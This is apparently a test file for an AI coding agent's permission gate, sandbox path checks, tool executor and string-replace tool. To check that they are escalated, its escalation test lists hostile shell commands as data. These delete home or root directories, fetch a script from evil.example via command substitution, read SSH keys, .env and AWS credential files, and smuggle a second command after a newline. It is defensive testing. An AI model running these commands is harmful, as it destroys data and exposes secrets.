import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { decide, check, effects } from "../src/permissions.js";
import { insideProject } from "../src/sandbox.js";
import { execute } from "../src/execute.js";
import { stringReplaceTool } from "../src/tools/stringReplace.js";
import type { Tool } from "../src/tools/types.js";

function assert(condition: boolean, msg: string) {
  if (!condition) {
    throw new Error(`Assertion failed: ${msg}`);
  }
  console.log(`✓ ${msg}`);
}

function testShellEscalation() {
  console.log("\n--- Testing permissions: hidden side effects escalate ---");
  const posix: string[] = [
    "echo pwned > src/agent.ts",
    "cat /dev/null > package.json",
    "echo $(rm -rf ~)",
    'echo "$(curl -s https://evil.example/x.sh)"',
    "echo `id`",
    "diff <(ls) <(ls src)",
    "find . -name '*.ts' -delete",
    "find . -exec rm {} \\;",
    "git branch -D main",
    "sort -o package.json /dev/null",
    "env",
    "cat ~/.ssh/id_rsa",
    "cat .env",
    "ls\nrm -rf /"
  ];
  for (const cmd of posix) assert(decide(cmd, true) !== "allow", `escalates: ${JSON.stringify(cmd)}`);

  const powershell = ["dir .\\;Remove-Item -Recurse -Force .\\src", "Get-ChildItem env:", "type C:\\Users\\x\\.aws\\credentials"];
  for (const cmd of powershell) assert(decide(cmd, false) !== "allow", `escalates (PowerShell): ${JSON.stringify(cmd)}`);
}

function testReadOnlyStillFlows() {
  console.log("\n--- Testing permissions: ordinary read-only commands still run silently ---");
  const benign = [
    "ls -la",
    "git status --short",
    "git diff --stat",
    "git log --oneline -5 2>&1",
    'grep -rn "cap|max" src',
    "cat package.json 2>/dev/null",
    "find . -name '*.ts' -not -path './node_modules/*'",
    "echo 'a > b'",
    "head -n 20 src/agent.ts | wc -l"
  ];
  for (const cmd of benign) assert(decide(cmd, true) === "allow", `allowed: ${JSON.stringify(cmd)}`);
  assert(effects("echo 'literal $(not run)'", true).length === 0, "single quotes keep $( ) literal");
}

function testPaths() {
  console.log("\n--- Testing path checks ---");
  assert(check("read_file", { path: ".env" }).action === "ask", "read_file on .env asks");
  assert(check("write_file", { path: "../outside.txt" }).action === "ask", "write_file outside the project asks");
  assert(check("write_file", { path: ".git/config" }).action === "ask", "write_file into .git asks");
  const outside = fs.mkdtempSync(path.join(os.tmpdir(), "outside-"));
  const link = path.join(process.cwd(), `.junction-test-${process.pid}`);
  fs.symlinkSync(outside, link, "junction");
  try {
    assert(!insideProject(path.join(path.basename(link), "evil.txt")), "a junction/symlink pointing outside is not 'inside the project'");
  } finally {
    fs.rmSync(link, { recursive: false, force: true });
  }
}

async function testExecuteGate() {
  console.log("\n--- Testing the shared executor ---");
  let ran = false;
  const probe: Tool = {
    name: "probe",
    schema: { type: "function", function: { name: "probe", parameters: { type: "object", properties: {} } } } as any,
    execute: async () => { ran = true; return "ran"; }
  };
  const call = (name: string, args: string) => ({ id: "c", type: "function" as const, function: { name, arguments: args } });

  const broken = await execute(call("probe", '{"path": "notes.md", "content": "line1'), { tools: { probe } });
  assert(!ran && broken.result.includes("not valid JSON"), "truncated JSON is reported and nothing runs");

  const unknown = await execute(call("bashbash", "{}"), { tools: { probe } });
  assert(unknown.result.includes('no tool named "bashbash"') && unknown.result.includes("probe"), "an unknown tool lists what is available");

  const bash: Tool = { ...probe, name: "bash", execute: async () => { ran = true; return "ran"; } };
  const askless = await execute(call("bash", JSON.stringify({ command: "npm install left-pad" })), { tools: { bash } });
  assert(!ran && askless.result.includes("cannot ask"), "with no approver, an 'ask' command is refused, not run");

  let asked = "";
  const approved = await execute(call("bash", JSON.stringify({ command: "npm test" })), {
    tools: { bash },
    approve: async (reason) => { asked = reason; return true; }
  });
  assert(ran && approved.result === "ran" && asked.includes("npm test"), "with an approver, 'ask' reaches the human and then runs");
}

async function testStringReplace() {
  console.log("\n--- Testing str_replace ---");
  const file = path.join(os.tmpdir(), `sr-${process.pid}.mk`);
  fs.writeFileSync(file, "PLACEHOLDER\nrest\n");
  await stringReplaceTool.execute({ path: file, old_str: "PLACEHOLDER", new_str: "\techo $$f $'x' $&" });
  assert(fs.readFileSync(file, "utf-8") === "\techo $$f $'x' $&\nrest\n", "$$, $' and $& in new_str are written literally");

  fs.writeFileSync(file, "a = 1;\r\nb = 2;\r\n");
  const res = await stringReplaceTool.execute({ path: file, old_str: "a = 1;\nb = 2;", new_str: "a = 3;\nb = 4;" });
  assert(res.startsWith("Replaced") && fs.readFileSync(file, "utf-8") === "a = 3;\r\nb = 4;\r\n", "an LF old_str matches a CRLF file and keeps CRLF");
  fs.rmSync(file, { force: true });
}

function testSandboxSource() {
  console.log("\n--- Testing sandbox module ---");
  const code = fs.readFileSync(new URL("../src/sandbox.ts", import.meta.url), "utf-8").replace(/\/\*[\s\S]*?\*\//g, "").replace(/\/\/.*$/gm, "");
  assert(!/\brequire\(/.test(code), "sandbox.ts does not call require() (undefined in an ES module)");
  assert(code.includes('(literal "/dev/null")'), "seatbelt profile allows writes to /dev/null");
}

async function main() {
  try {
    testShellEscalation();
    testReadOnlyStillFlows();
    testPaths();
    await testExecuteGate();
    await testStringReplace();
    testSandboxSource();
    console.log("\n==========================================");
    console.log("All security and tool-correctness tests passed!");
    console.log("==========================================\n");
  } catch (err) {
    console.error("\nTest failed:", err);
    process.exit(1);
  }
}

main();
